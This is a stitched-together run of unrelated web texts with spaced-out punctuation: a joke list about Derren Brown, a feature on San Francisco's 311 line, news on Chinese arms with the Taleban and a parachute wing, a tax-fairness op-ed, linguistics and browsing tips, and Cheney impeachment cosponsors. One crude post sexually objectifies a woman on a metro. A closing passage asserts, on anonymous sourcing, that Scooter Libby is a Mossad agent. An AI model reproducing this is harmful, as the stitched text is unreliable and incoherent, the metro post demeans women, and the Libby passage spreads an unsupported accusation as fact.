7 Safety Tips For Dealing With Derren Brown
Derren Brown is a British ( what I like to call at least ) “ mentalist . ”
You might have seen the mindgrope he performed on Simon Pegg or the even more popular video where he put a guy into a zombie video game .
Basically , he ’s a very , very scary man .
He ’s one step away from being an X - Men villain .
In fact , he could be a villain right now …and could we trust ourselves to remember him taking over the world ?
I do n’t think so .
Anyway , I ’ve watched everything the man ’s put out in the UK except for his latest series .
That ’s right , all the shows , all the specials , everything .
And I ’ve decided that I should put my knowledge of Derren to good use .
Because he scares the living bejeesus out of me .
And he should scare the same right out of you , too .
So we must prepare ourselves .
Therefore , here are my 7 Safety Tips for Dealing With Derren Brown .
I ’ve tried to add video notations where necessary so I can stress the urgency of taking me seriously .
Well .
Kinda .
[ ad#shortpost ]
1. Do n’t Deal With Derren Brown .
This should be patently obvious .
But considering blogs write up patently obvious things every single day , put them in lists , and publish them , then get mad hits and Diggification off of them–eh , to hell with it .
But basically if you ’re around him , he can mess with your head .
He can get you to do things you would n’t normally do and think nothing of it .
So if you see him coming , your best bet is to just walk the other direction .
That ’s not guaranteed , because that could be exactly what he wants .
If so , then you ’re fucked .

2. Do n’t Go to the United Kingdom .
This is n’t 100 % foolproof , mind you .
He does come to the States every now and again .
But for the most part he seems content to screw with the minds of our friends across the pond .
For all we know he ’s really running the place over there , because how could we prove otherwise ?
Granted , if you ’re already in the UK , then this tip is fairly problematic : you should either leave , or you ’re fucked .
Direct link for the feedreaders .
3 . If You Suddenly Find Yourself in the UK , and Derren Approaches , Do n’t Look at Him .
Looking at him has been known to , in the right circumstances , make you queasy , uneasy , and generally feeling right terrified .
If he catches your gaze , whether as part of a “ staring competition ” or not , then you ’re fucked .
See this bonus bit to understand that you might not even see him coming .
So…well , you ’re fucked either way , are n’t you ?

4. If You Cannot Escape Him , Do Not Let Him Touch You .
Apparently his very touch can really make some wild things happen in your brain , as evidenced in this clip below , which is probably the scariest thing I ’ve seen him pull off .
If he touches you , even in the most seemingly innocent way , then you ’re fucked .
Direct link for the feedreaders .
5. If He Manages to Touch You , At Least Keep Him From Taking Hold of Your Wrist .
If you think him just touching you is bad , then if he takes hold of your wrist , then he is about to work the Serious Mojo on you .
If Derren was an action figure , Serious Mojo would be his accessory .
I have no idea what it would look like , but it would strike fear into the hearts of your other toys .
And make them think they were monkeys .
When he ’s got your wrist , that ’s when he starts saying specific things and specific triggers that could do something seemingly innocent ( like with dude below ) or turn you into a Manchurian Candidate , a puppet doing only his bidding .
If he takes hold of your wrist , you ’re fucked .
6. If He Manages to Take Hold of Your Wrist , For the Love of Baby Jesus Do n’t Let Him Put Your Hand Over Your Face .
Okay , I know that sounds weird , but Derren can apparently put people “ under ” in two seconds flat .
It can be compared to sticking a chicken ’s head under its wing .
You go right out .
Now , I ’m not exactly sure what fu you would need to stop him from putting your hand over your face at this point , since he does have control of your wrist ( and thus the rest of you ) .
I do n’t even have a “ Keep your hand at the level of your eyes ” idea , because naturally , that ’s just a shorter distance to put said hand over your eyes and boom .
So just bear in mind at this point , you ’re fucked .
( Note : Could n’t find a video of this .
Funny how this has no documentation to be found easily , does n’t it ?
HMMMM ? )
7. Even If He Does n’t Touch You , Do n’t Let Him Not Touch You Either .
Yes , this again seems patently obvious , but he ’s cunning .
You might keep him from touching you or grabbing your wrist , but do n’t think you ’re in the clear .
He might be setting you up for something even more diabolical .
He might want you to think you ’re fine , but then , naturally , you ’re fucked .
Of course , this assumes he ’ll let you run away .
Direct link for the feedreaders .
So that ’s it , sports fans .
Your best bet is just to stay places where he is not and go nowhere near him in the first place .
When his Starro - like takeover of the world happens ( assuming it has n’t already ) , then you ’ll be the few folks able to hold out until his zombie hordes come and crush you in your hidden lair .
Of course , until then it ’s not safe to pick up the phone ( since he can put you to sleep over the line ) and it ’s not even safe to play video games ( re : the zombie game ) , so your best bet is to stay in your bunker and read Needcoffee .
We promise to stay as mind control free as possible .
Unless he makes us a really good deal .
But until then , you ’re safe with us .
Well .
Mostly .
Buy Stuff – It Supports the Site !
Forget the Golden Gate Bridge and House of Nanking and Zeitgeist on a summer night -- the heart of San Francisco beats loudest on the carpeted second floor of that South Van Ness building you thought was Bank of America .
" Thank you for calling San Francisco 311 , this is Kyle speaking , how may I help you ? "
" Yes , there 's a skunk with his head stuck ... "
Kyle Sutton is one of 50 or so customer service representatives , or CSRs , asking this question 24 hours a day , 365 days a year .
The free service launched in March not just to funnel 2,300 government phone numbers into a single line , but to give the city more of a service orientation .
About 6,000 calls come in every day , and program director Ed Reiskin says 311 is on track to answer 2 million a year .
Officially , the purpose is to supply a handy route to non-emergency government services and information .
Unofficially , it 's a glimpse into the funny inner mind of the city .
" Hello , how long does it take to build a cable car ? "
" There 's cocaine all over my clothes !
There 's cocaine everywhere ! "
" My roommate has been passed out for two days . "
" There 's pig balls on the street . "
Ideally , every call would be like these and our city would have the best dinner parties ever .
In fact , most people call about the bus .
How do you get to Justin Herman Plaza ?
I 'm on Clement and 8th Avenue , where 's the 2 ?
My driver did n't stop for me .
There 's cocaine all over the 24 .
( OK , that last one was just a guess . )
What these calls lack in color , they make up for in mind - blowing bulk .
Roughly 4,000 MUNI calls a day , and less than half a year into 311's existence -- who knew a fairly straightforward bus schedule could yield so much confusion ?
It could n't , some CSRs suspect .
What 311 has laid bare is n't a mystifying bus schedule but a mystifying wedge of human nature .
Give people a free phone number and they 'll call it .
" Some people just seem to like to talk , " Sutton says .
" Or else ask questions .
We try to get them what they need and politely move on to the next call . "
Anonymity .
Technology .
Excessive information gathering .
The elements of 311 are very much those of the Internet age ( do people still say that ? ) , and in ways the service resembles a kind of Google hotline just for San Francisco .
As with Google , it seems the service can give rise to the questions , rather than vice versa .
( One of the more common questions : What time is it ? )
A sweet intimacy sometimes makes its way onto the line .
The other day , a couple of girls placed a three - way call asking which buses would get them to each other ; as Sutton pulled up the information , the two chitchatted .
Other times , the intimacy goes too far .
( " Is there anything else I can help you with today ? "
" Well , not over the phone ... " )
Some callers enjoy 311 so much they call back again and again .
Perhaps the most well - known serial caller has dubbed himself " the Graffiti Wolf . "
" He walks around the city on the phone , calling in all the graffiti he sees .
He might call five to seven times a day .
I once had him give me 35 reports on one call , " says Michelle Hampton , another CSR here .
" At one point he just said , ' This is what I do . ' "
Other serial callers already have reputations elsewhere in the city -- with the police , for instance .
Sutton recalled one woman who complained that her neighbors were spraying something under her doors , in an attempt to suffocate her .
When Sutton told police of the call , they more or less sighed .
" Turns out they 'd already sent seven officers on seven different occasions , " Sutton said .
" They did n't find anything sprayed under her door . "
Neighbors are a recurring motif .
There was the woman whose neighbor kept talking to a boulder .
Used to be , she talked to raccoons and squirrels , but the city came and spoke with her -- huh ? -- and now she was onto large rocks .
Which would n't have been a problem had this particular rock not been perched on a hill above the caller 's house .
And had the boulder - talker not gotten in the habit of digging around the base of the thing during every conversation .
One day , the caller said , that boulder 's going to roll right through my sliding doors .
The CSRs got on it .
An Environment Department team was dispatched to remove the boulder .
Reiskin describes 311 as a rare service that touches all parts of the city -- no mean trick , given the horizontal arrangement of San Francisco government .
Unlike , say , Oakland , no city administrator runs the city 's day - to - day affairs ; Mayor Gavin Newsom is the sole point of authority for the assorted and largely autonomous agencies .
For a CSR to know how to register someone for a Parks & Rec program , get a document from the Office of Vital Records or report a pothole to the Department of Public Works , Reiskin says , 311 must first knock on a lot of government doors .
" We never want to say , ' I do n't know , ' " Reiskin says .
If you 're picturing a chaotic air - traffic - control environment , take it down a notch .
The office is busy but not frantic , efficient but not harried , big but not sprawling .
Sutton , Hampton and the other CSRs have an air of Zen to them even as they zip from screen to screen , transitioning from lost birth certificates to mattresses abandoned on sidewalks .
Most of all , they 're bizarrely pleasant .
That evil AT&T operator you got last week ?
Not even the same species .
The CSRs here are n't just kind and knowledgeable , they seem to be genuinely curious about , say , how long garbage cans can stay out on the street , too .
Four months of training weeds out those who lack the patience that Sutton calls essential .
Salaries range from $ 49,000 to $ 59,000 .
Incidentally , do n't fret if you prefer to report your potholes in Greek .
Over 150 languages can be accommodated , thanks to a network of interpreters on standby .
Of course confusion , is possible even with translation .
" My neighbor 's window is open , " one caller told Hampton .
" I see . "
" The city needs to close it . "
" Well , it 's not illegal for a neighbor to have his or her window open . "
" But the window is open ... "
The conversation went on and on , Hampton recalls , without much deviation from that central theme .
Finally she had an idea .
" Is this a window that is n't supposed to be there ? "
" Yes . "
" Are you saying it was built without a permit ? "
" Yes . "
A bit more detective work and the situation was resolved .
It 's no wonder Hampton is the CSR that the mayor gets paired with , when he visits .
" He just sits here and listens to the conversations , " Hampton reports .
" Sometimes he 'll even jump in .
I 'll finish answering the caller 's question and he 'll say , ' This is Mayor Newsom , I just wanted to thank you for calling 311 today . '
They 're usually a little stunned a first , then appreciative .
One guy started to tell him what he really thought of him .
The mayor just listened and thanked him . "
Other common calls :
Come get rid of this mattress on the sidewalk .
I need a birth certificate .
My streetlight 's out .
The breadth of the city 's responsibilities are staggering -- as Sutton scrolled , I saw one page dedicated to reports of dead mice or rats on public property .
" I had no idea there are so many programs where the city is actually trying to help citizens , " Hampton says .
" And I had no idea citizens were so well - versed in how a city works .
San Franciscans have a real feeling that the government is responsible to them .
And they 'll express it . "
Plugging in a set of headphones , I expected to overhear the sort of rudeness one associates with anonymous phone calls to large institutions .
To my surprise , the majority of callers were friendly , even personable -- enough so that when one caller failed to thank Sutton for his help , it stood out .
" You know , I do n't even notice anymore , " he said when I remarked on it .
" We get so many calls , it would n't work if we registered whether or not they say thanks . "
Which is n't to say some calls are n't affecting .
" Someone might call in for bus information and then start talking about getting to the methadone clinic .
Or maybe they 're trying to find in - home healthcare for their grandfather , and you went through something similar -- you can't help but empathize sometimes , " Hampton says .
" You try not to get attached , but there are those five or six calls each day that stick with you , " Sutton says .
" When an elderly woman calls needing services because she says her family does n't love her , that 's hard to hear . "
Some time back , Sutton picked up the phone to the sounds of a grown man crying .
The man had cashed a check that day , then left his wallet on the bus .
It was his son's birthday , and he no longer had money for a present .
Sutton worked overtime on this call , but by the end of the day he suspected the wallet was gone .
" He just kept saying , ' It 's his birthday , it 's his birthday , ' " Sutton recalls .
Still , karma has a way of evening out at the call center .
Just last week someone phoned about a wad of cash he'd found on a different bus .
The information was noted , sent to the appropriate body and the next call was answered .
Possibly skunk - related .
Chris Colin was a writer - editor at Salon , and before that a busboy , a bread deliverer and a bike messenger , among other things .
He 's the author of " What Really Happened to the Class of ' 93 , " about the lives of his former high school classmates , and co-author of " The Blue Pages , " a directory of companies rated by their politics and social practices .
His writing has appeared in the New York Times , Mother Jones , the New York Observer , McSweeney 's Quarterly and several anthologies .
He lives in San Francisco .

in fact , when you bought this item , you knew that you were going to wear it , in public , and it would be revealing your tits a little ( or a lot ) .
make no mistake , i applaud you for this .
but what i'm getting at , is that we both know you were showing off your rack .
do n't lie , it 's not very subtle .
and do n't pretend it 's a fashion thing .
it 's a hooter thing .
so when you buy the top , and wear it , in the summer , in public , and you 're going to stand in front of me , guess what .
I 'm going to look at your boobs .
first off , you should be flattered .
i looked at them because they are nice .
you should be upset if you were showing off your knockers and i did n't look at them .
actually , them being nice is why i looked at them repeatedly .
the first peek was more of an instinct .
guy - instinct .
we can't help it .
after that , we just want to see as much of it as we can .
to us , boobs are like the Godfather parts I and II .
we can watch them over and over and never get tired of them .
anyway , yea , i looked at your cans .
a bunch of times , actually .
now , i understand no one likes to be stared at .
this is why i did in fact look around the rest of the metro to see if there was anything else interesting to look at .
unfortunately there were no other hot babes , no bums , no cute babies , no one was wearing a Slayer reign in blood tour shirt .
nothing .
so i went back to your melons .
sorry .
it was a boring ride , and they were right in front of me .
but i think you forget that i was nice enough to focus on your funbags , as opposed to alternating between them and trying to make eyecontact .
now that would have been ungentlemen - like .
i realise no one finds true love over a pair of jugs on the orange line .
it 's just not realistic .
so i kept my head down , stood in a position as to be not overly obvious about my staring , made sure i did n't get a semi ( i got real close once , but i handled it ) , and tried to be as polite about the situation as possible .
so anyway , i just thought you should know my point of view on what happened .
i am not a pervert .
i was just a man on a metro .
a man who saw something that pulled his mind out of the daily routine , and i held onto it dearly ( not literally , ofcourse , though that would have been pretty sick ) .
but as you can tell from this long posting , i do feel slightly bad about my behaviour .
so to make up for it , i have decided , with pain in my heart , to release you from my spank bank .
i think it is fair to say we are even now .
i think i did see a hint of slight animal lust in your eyes when you gave me that annoyed look and got out of the metro .
so if you are reading this , baby , i'd really like to take you on a trip ... a motorboating trip .
If your image of the typical rich person is someone who collects interest and dividend checks and spends long afternoons relaxing on his yacht , you are decades out of date .
The leisure class has been replaced by the working rich .
Another piece of the puzzle is that Mr. Buffett ’s tax burden is larger than it first appears , because he is a major shareholder in Berkshire Hathaway .
When the C.B.O. studies the tax burden , it includes all federal taxes , including individual income taxes , payroll taxes and corporate income taxes .
In its analysis , payroll taxes are borne by workers , and corporate taxes by the owners of capital .
For the richest 1 percent of the population , 9.3 percentage points of their 31.1 percent tax rate comes from the taxes that corporations have paid on their behalf .
The corporate tax would undoubtedly loom large if the C.B.O. were to calculate Mr. Buffett ’s effective tax rate .
None of these calculations , however , say whether the rich are paying their fair share .
Fairness is not an economic concept .
If you want to talk fairness , you have to leave the department of economics and head over to philosophy .
The quintessential political philosopher of modern liberalism is John Rawls , the author of the 1971 classic “ A Theory of Justice . ”
Professor Rawls concluded that the primary goal of public policy should be to redistribute resources to help those at the very bottom of the economic ladder .
If Professor Rawls were alive today , he would most likely want to raise the top income tax rate of 35 percent in order to finance a more generous safety net .
And for much the same reason , he would probably raise taxes on the middle class as well .
Professor Rawls would get a vigorous debate from his Harvard colleague , the libertarian philosopher Robert Nozick .
In his 1974 book , “ Anarchy , State , and Utopia , ” Professor Nozick wrote : “ We are not in the position of children who have been given portions of pie by someone who now makes last - minute adjustments to rectify careless cutting .
There is no central distribution , no person or group entitled to control all the resources , jointly deciding how they are to be doled out .
What each person gets , he gets from others who give to him in exchange for something , or as a gift .
In a free society , diverse persons control different resources , and new holdings arise out of the voluntary exchanges and actions of persons . ”
To libertarians like Professor Nozick , requiring the rich to pay more just because they are rich is little more than officially sanctioned theft .

BBC Asia bureau chief , Beijing
A large number of British troops are based in Afghanistan
The BBC has been told that on several occasions Chinese arms have been recovered after attacks on British and American troops by Afghan insurgents .
The authorities in Beijing have promised to carry out an investigation .
This appears to be the first time Britain has asked China how its arms are ending up with the Taleban .
Boasting
At a meeting held recently at the Chinese foreign ministry in Beijing , a British official expressed the UK 's growing concern about the incidents .
When asked about the latest British concerns , the Chinese foreign ministry referred back to a statement made by their spokesman Qin Gang in July who said China 's arms exports were carried out " in strict accordance with our law and our international obligations " .
For their part , the Taleban have recently begun boasting that they have now got hold of much more sophisticated weaponry although they refused to say from where .
Afghan officials have also privately confirmed to the BBC that sophisticated Chinese weapons are now in the hands of the Taleban .
Taleban forces fled Kabul in 2001
They said these included Chinese - made surface - to - air missiles , anti-aircraft guns , landmines , rocket - propelled grenades and components for roadside bombs .
A senior Afghan official told the BBC : " Chinese HN - 5 anti-aircraft missiles are with the Taleban , we know this ... and we are worried where do the Taleban get them , some of these weapons have been made recently in Chinese factories . "
Another Afghan official who deals with counter - terrorism said : " Serial numbers and other information from most of the Chinese weapons have been removed in most cases and it's almost impossible for us to find out where they come from but we have shared our concerns with the Chinese and the Americans also . "
Worried
The Afghan government considers China to be a friend , and a much less meddlesome ally than the other big player in its neighbourhood , India .
But , the counter - terrorism official added , " China is worried about the presence of the US in the region " .
Southern Afghanistan has been awash with Chinese made arms for decades which are some of the cheapest on the market .
In the past the Taleban got them via the Pakistan intelligence agency , the ISI , or bought them directly from arms smugglers .
But it is extremely unlikely the ISI would now allow them access to anti-aircraft missiles or armour - piercing ammunition .
Taleban regularly target foreign troops in Afghanistan
The Pakistani army 's relationship between militants in its tribal areas along the Afghan border has deteriorated sharply in recent years after Washington put pressure on President Musharraf post - 9/11 to crack down on al - Qaeda and Taleban groups operating inside Pakistani territory .
So the Taleban might well use any sophisticated new weapons it received against the Pakistani army .
It is not in China 's interest either to arm Pakistan - based militants .
Over the last couple of years Chinese workers in Pakistan have been targeted by militants , in retaliation for the Pakistani army allegedly going after hard - line Muslim Uighur leaders from China 's Xinjiang province , hiding in the tribal areas .
Proxy network
So instead of Pakistan being the transit point for these weapons , the finger is being pointed by many commentators towards Iran .
The Afghan government has long acknowledged privately that Iranian intelligence agencies have been active in southern Afghanistan post - 9/11 .
Iran has been pursuing a policy of building up proxy networks to be able to attack American forces in response to any US attacks against Teheran 's nuclear infrastructure .
The Americans are suspicious of Iran 's role in Afghanistan
A Shia Iran and the Sunni Taleban had been firm enemies since 1998 .
Then , Iran threatened to invade western Afghanistan , when the country was largely controlled by the Taleban , after nine of its diplomats were massacred in Mazar - e - Sharif .
But times have changed , now America is a common enemy and senior American commanders in Afghanistan have acknowledged the growing ties between the two .
The complication for both the UK and US is China .
Unnamed US officials have recently been quoted as saying that China has been selling arms to Iran which Iran is then passing on to insurgent groups in Afghanistan and Iraq .
China 's booming economy and its seat at the UN security council have made it an important player on the world stage .
It is a major trading partner for the UK whose economy has benefited enormously from China 's cheap goods .
Prime Minister Gordon Brown 's newly - appointed British Minister for Asia , Lord Mark Malloch Brown acknowledged to journalists in Beijing last week that countries " need to work with China to get things done in today 's world " .
China is going to have to show that getting things done also means stopping its arms illegally ending up in the hands of men bent on killing British troops .

DSEi OK , so you 're an elite special forces type .
You 're just checking that your beeper shows enough that the girls across the bar will notice it , when the damn thing goes off .
You race into the barracks .
It seems that there 's this crisis somewhere - hostages , WMDs , cat stuck up a tree - does n't matter .
Somebody 's arse needs foot contact , and your team has the boots for the job .
But there 's a problem .
The location to be reached lies within hostile airspace , swept by enemy radars .
The only way you can get there fast enough is by transport plane : but if your aircraft goes near the target , bad things will happen .
The Gryphon strapon stealth - jet parachute in testing .
Normally , you 'd go with what 's called a HAHO parachute jump , High Altitude High Opening .
HAHO is a variant on the perhaps better known HALO ( High Altitude Low Opening ) .
With HALO , you jump out and freefall most of the way , opening your chute at the last moment .
This means you get down fast and minimise your chance of being spotted , but obviously the plane needs to fly close to the landing zone .
With HAHO , on the other hand , you get out up in the stratosphere and open your chute immediately .
Modern high - performance parachutes have quite good glide performance , and you can travel a long way like this - say 40 km in still airs , or even 60 with the wind behind you , jumping from 33,000 feet .
But damn - today , 40 km just wo n't do it .
Today the target lies more than 100 km within hostile borders , and some utter bastard has sold the local force air - search radars .
( Who would do that ? )
HAHO troopers do show up on radar , and they can often be tracked for most of their descent .
Today 's the day for Gryphon .
You and your buddies strap on your astounding , stealthy delta - winged backpack airframes , packing most of your kit inside them to minimise radar signature .
As the transport plane flies innocently along on the safe side of the border , the team jumps out .
Your helmet heads - up displays give you full navigation readouts , and the Gryphon almost flies itself with computer - aided controls , so that you can merrily zoom through clouds or bad weather without trouble .
As you start to get near the ground , you fire up the mini jet engines ( yes , it can have mini jet engines , apparently ) and fly on , covering over 100 km with ease .
You can even boost up and over a hill or two towards the end , in terrain - following mode .
The radar operators on the ground never stand a chance .
As you come in to land , you pop open a conventional chute , and release the Gryphon wing to hang beneath you .
It hits the ground , and then you do .
And there you are - 150 km inside hostile , well - defended airspace .
It 's going to be a bloody long walk back out again , that 's for sure .
The Gryphon is actually a reality ; though it does n't yet have its mini jet engines and it is n't in service with any special forces .
The amazing strap - on wing is on show at the DSEi killware expo this week , and the Reg defence desk got the chance to chat with Erich Jelitko , Geschaftsfuhrer ( MD , roughly ) of Spelco ( Special Parachute Equipment and Logistics Consortium GbR ) .
Spelco makes HAHO parachute rigs for the German special forces , and Jelitko is a former instructor at the German army 's parachute school .
He 's also one of two men who have flown the Gryphon , with 74 flights / jumps logged ; though he seems quite normal .
Without its jets , the Gryphon does n't carry you a lot further away from the drop aircraft than a HAHO rig .
But Jelitko still reckons it 's better .
He says you get down a lot faster - 15 minutes in the air , as opposed to an hour or more - and its radar return is reduced too .
While Spelco has n't done formal tests , Jelitko says that he 's been told the Gryphon is about as detectable " as a bird " on radar .
As for the jets , he says that plan is entirely practical .
Spelco will apparently fit small turbojets - of a type apparently used in model aircraft - to the Gryphon next year , and Jelitko says he 's looking forward to trying the new rig .
He reckons that there should be twenty minutes of fuel , and enough poke to gain altitude slowly if required .
" Our calculations say 178 km range , " he says .
" But of course we have to test this . "
The rough Spelco flight plan would call for departing the aeroplane at 33,000 - odd feet and gliding down .
From 20,000 feet the jets will light up , and the Gryphon troopers can fly high for best range or hug the ground for stealthiness .
Once the fuel runs out , it 's glide and then pop the chute to land as normal .
As for getting home again from 178 km into bandit country , Jelitko says " it 's not for the German forces . "
He says he 's been invited to take the Gryphon to America , but so far has n't done so due to concerns over people copying all his kit and perhaps not paying .
The US forces might be able to suddenly open up an air corridor into defended airspace quickly enough to extract a team of Gryphon troopers before they ran out of supplies or got hunted down or overrun .
A stealthy Gryphon insertion followed by a massive air assault might be an option where there was a target which might move away on short notice , or if there were hostages who might be done in at any sign of a rescue mission .
Jelitko also says that people have asked why not have a rocket or something , and simply take off again after the mission , boosting oneself up to gliding height once more .
" But I 'm not crazy , " he says .

Linguistic incompetence in Britain

With regard to your leader lamenting the willingness [ I would have said " unwillingness " ] of the British to learn Johnny Foreigner 's native tongue , perhaps you could turn your attention to persuading Britons to master their own language first ...

ENGLISH
they're
there
Posted by Arnold Zwicky at January 8 , 2007 12:12 PM
Back on 16 December thetook up not only the three new official languages of the EU ( reported on here ) , but also the monolingualism of Britons .
There was a leader ( U.S. : editorial ) , on p. 14 , and a news story , on pp. 55 - 6 , about how Britons are " God 's worst linguists " : " just 30 % of Britons can converse in a language other than their own ( only Hungarians did worse ) " , and fewer and fewer young people are studying languages in school .
( Why bother ?
Everyone else is learning English ! )
We chatted about these pieces over sherry in the Writers ' Lounge at Language Log Plaza at the time , but the story did n't seem significant enough to merit blogging .
Even in Europe , the Hungarians ( are said to ) do worse than the Britons ( though only by one percentage point ) , and surely Americans and Australians would give the Brits a run for their money in the foreign language incompetence sweepstakes .
( Actually , that 30 % figure seems high .
The figures are from a European Commission report of 2005 , based on a questionnaire administered to 29,328 people , and they represent the percentages of people in each member state who " assert that they can speak at least one other language than their mother tongue at the level of being able to have a conversation . "
We might expect such self - reports to be a bit , well , optimistic . )
Now there 's a new twist : are Britons competent even in their own language ?
In a letter in the 6 January issue of the ( p. 14 ) , Jason Smith of London raises the issue : Yes , it 's about ( including punctuation and capitalization ) .
I was prepared to see a rant about non-standard grammar or the innovations of the young or even the appalling pronunciations of Estuary English , but instead -- in response to pieces about people 's ability toin languages other than their mother tongue -- we get a hell - in - a - handbasket letter about spelling .
English orthography is cunningly mined with traps for the unwary , and ordinary people writing in English have never been particularly good at avoiding the traps .*[*
Bob Yates addresses the issue in e-mail to me :
In addition , spelling ability is at best weakly connected to measures of verbal facility , intelligence , and the like .
Being " good at " spelling in English ( note : in ) is one of those odd language - related talents like being good at Double - Crostics or being able to talk ad lib in iambic pentameter or being able to rap .
If you 're not good at spelling , you 'll have to find a way to work around that in circumstances where spelling is important , but you should n't let spelling problems prevent you from writing ; after all , some spectacularly bad spellers are very good writers indeed .
On the other hand , if you can't frame what you want to say in ways that your intended audience will be able to understand without hard work , you 're in trouble .
If this is in your mother tongue , you have some sort of disability .
I 've spent a fair amount of time with people with such disabilities , and it 's distressing all around .
( Maybe I 'll be able to post about this , maybe not .
The case I know the most about is my partner of 26 years , now dead . )
Two notes : a claim about the ability to hold a conversation in a language other than your mother tongue got turned into a rant about writing , in fact about the mechanics of writing , thus trivializing a serious issue ; and all deviations from correctness , all kinds of " incompetence " , are treated as equivalent , thus elevating poor spelling to a significance it does n't deserve .
Why , someone who would spellasmight be capable of anything ! zwicky at - sign csli period stanford period edu
This week we covered the launch of Autobahn Accelerator for MySpaceTV : the speed boosting tool now works with the video sharing site to increase download speed .
But that 's not the only tool that can speed up your web experience : over the last 17 days , Google Web Accelerator has saved me about 1.8 hours of download time .
While that might not seem like much , it ’s approximately 38 hours per year , or roughly a day and a half .
From changing your DNS settings to blocking advertising , here 's our guide to faster web surfing .
Feel free to add your own tips in the comments .
Google uses a variety of methods including its vast computer network to speed up your Web browsing .
Once installed into your browser , Google Web Accelerator compresses data , stores frequently viewed pages , and helps manage your Internet connection .
It ’s designed primarily to speed things up for broadband users .
However , Google Web Accelerator only accelerates
Web pages , not downloads or streaming audio / video .
Technically , it ’s still a part of Google Labs .
By changing your Preferred DNS Address to OpenDNS ’s IP , you will essentially be using their network to connect to web sites , where they run what they claim are some of the Web ’s largest DNS caches .
Versus looking up a web site ’s IP address each time you visit , a DNS cache stores this information which saves time .
By using OpenDNS , you also get the ability to block web sites , an address bar that corrects common typos , and phishing protection .
OpenDNS provides detailed instructions on how to setup your machine to utilize its services for all major operating systems .
An extension for Firefox , Fasterfox speeds up browsing by “ prefetching ” – which is loading links on a web page in the background while you ’re sitting idle ( or reading ) a given site .
Additionally , Fasterfox provides tools for tweaking your network settings and includes a pop-up blocker .
Fasterfox is a project of the non-profit Mozdev Community Organization .
Graphic heavy advertising can slow down load times .
Adblock , an extension for Firefox , hides advertisements on web pages based on filters that the user can define .
For example , you can disable a URL with “ / ad ” in it , or filter out images served from doubleclick.com .
SpeedBit offers software to accelerate the pace of downloads .
They claim more than 100 million users have tried their product , which uses the company ’s algorithms to most effectively utilize bandwidth .
For SpeedBit ’s latest release , Download Accelerator Plus 8.5 , the company claims up to 400 % faster downloads .
Download Accelerator
Plus also allows you to resume broken downloads .
SpeedBit has been offering download acceleration tools since 1999 and offers premium versions with additional benefits .
Once downloaded , SpeedBit Video Accelerator works to speed up video streams on most major video sites including YouTube , Metacafe , and MySpace .
The Video Accelerator works using what the company calls “ multi connection ” technology that eliminates the hiccups that are frequent in streaming video , especially on slower connections .
Additionally , Video Accelerator includes a desktop app that you can use to search most of the major video sites and stream content .
Autobahn is an application for accelerating downloads on popular sites .
Currently , Autobahn can improve speeds on iTunes and MySpaceTV .
The technology is a similar concept to SpeedBit , creating multiple simultaneous connections to help prevent the hiccups common in a typical audio or video stream .
Autobahn is a product of Swarmcast .

Congresswoman Tammy Baldwin ( D. , Wisconsin ) and Congressman Donald Payne ( D. , N.J. ) have signed on as cosponsors of H. Res. 333 , a bill proposing articles of impeachment against Vice President Dick Cheney , according to Congressman Dennis Kucinich 's office .
Kucinich is the original sponsor of the bill .
Baldwin is the fourth member of the House Judiciary Committee to have added her name to the bill .
A fifth Judiciary Committee member , Steve Cohen , has thus far signed on only to a bill proposing the impeachment of Attorney General Alberto Gonzales .
H Res 333 cosponsors include , in addition to Baldwin , Payne , and Kucinich : Jan Schakowsky , Maxine Waters , Hank Johnson , Keith Ellison , Lynn Woolsey , Barbara Lee , Albert Wynn , William Lacy Clay , Yvette Clarke , Jim McDermott , Jim Moran , Bob Filner , Sam Farr , Robert Brady .
That bill , H. Res. 589 sponsored by Congressman Jay Inslee , has 15 cosponsors in addition to Inslee : Xavier Becerra , Michael Arcuri , Ben Chandler , Dennis Moore , Bruce Braley , Tom Udall , Earl Blumenauer , Peter DeFazio , Hank Johnson , Steve Cohen , Keith Ellison , David Wu , Yvette Clarke , Darlene Hooley , Betty McCollum .
Johnson , Ellison , and Clarke are backing both bills .
Congressmen Jesse Jackson Jr. and Maurice Hinchey have recently said that they support the impeachment of Cheney and Bush , but have not yet signed onto any bills .
Speaker of the House Nancy Pelosi has opposed impeachment since May 2006 , but this week said that if she were not the Speaker she would probably be backing impeachment , and that impeachment of Gonzales is clearly merited .
I. Lewis " Scooter " Libby has been a long - serving intelligence agent for Israel 's Mossad , according to a veteran CIA " official cover " officer who spoke to WMR on deep background .
The CIA 's Clandestine Service has , over the years , gathered a tremendous amount of intelligence on Libby 's activities on behalf of Mossad .
Libby served as the lawyer for Switzerland - based American fugitive financier Marc Rich , aka Mark David Reich , who is also known to be an Israeli intelligence asset and someone Israel relies upon for missions that demand " plausible deniability " on the part of the Mossad .
Rich heads up a worldwide empire of dummy corporations , foundations , and numbered bank accounts that have been involved in sanctions busting and weapons smuggling .
The nations involved include Israel , United States , United Kingdom , Iran , Panama , Colombia , Russia , Iraq ( under Saddam Hussein ) , Cuba , Spain , Nigeria , Singapore , Bolivia , Jamaica , Bermuda , France , Italy , East Germany , Czechoslovakia , Austria , Kazakhstan , Philippines , Australia , Argentina , Peru , Ireland , Zambia , Sweden , Monaco , and apartheid South Africa .
In 1983 , the then - U.S. Attorney for the Southern District of New York urged jail time for Rich and his partner Pincus Green for racketeering .
The name of that U.S. Attorney is Rudolph Giuliani .
Giuliani , who is now running for president , praised Bush 's decision to commute Libby 's jail sentence .
After Clinton 's pardon of Rich , Giuliani said he was " shocked . "
Paul Klebnikov , the Moscow editor for Forbes ' Russian edition , wrote about the connections of Rich to Russian gangsters like Boris Berezovsky , a business partner of Neil Bush , in his book " Godfather of the Kremlin . "
Klebnikov was shot to death gangland - style on a Moscow street on July 9 , 2004 .
Libby not only provided the Mossad with a top agent inside the White House but also an important conduit for the Russian - Israeli Mafia .
Libby arranged for Rich 's eleventh hour pardon by outgoing President Bill Clinton in January 2001 .
The pardon of Rich was urged in a phone call to Clinton by then - Israeli Prime Minister Ehud Barak , as well as Shimon Peres and Ehud Olmert .
Yesterday , Libby received a commutation of his 30 - month prison sentence from President George W. Bush .
Libby was convicted on four counts of perjury , lying to a federal law enforcement officer , and obstruction of justice in the investigation by U.S. Special Counsel Patrick Fitzgerald of the White House 's leak to the media of the identity CIA non-official cover officer Valerie Plame Wilson .
Libby was denied bail by U.S. Judge Reggie Walton and was ordered to prison while appealing his sentence .
Libby was assigned Bureau of Prisons inmate number 28301-016 .
Libby worked for Paul Wolfowitz in the State Department 's Bureau of East Asian and Pacific Affairs from 1982 to 1985 .
Libby again worked for Wolfowitz in the Pentagon as the Principal Undersecretary for Strategy and Resources .
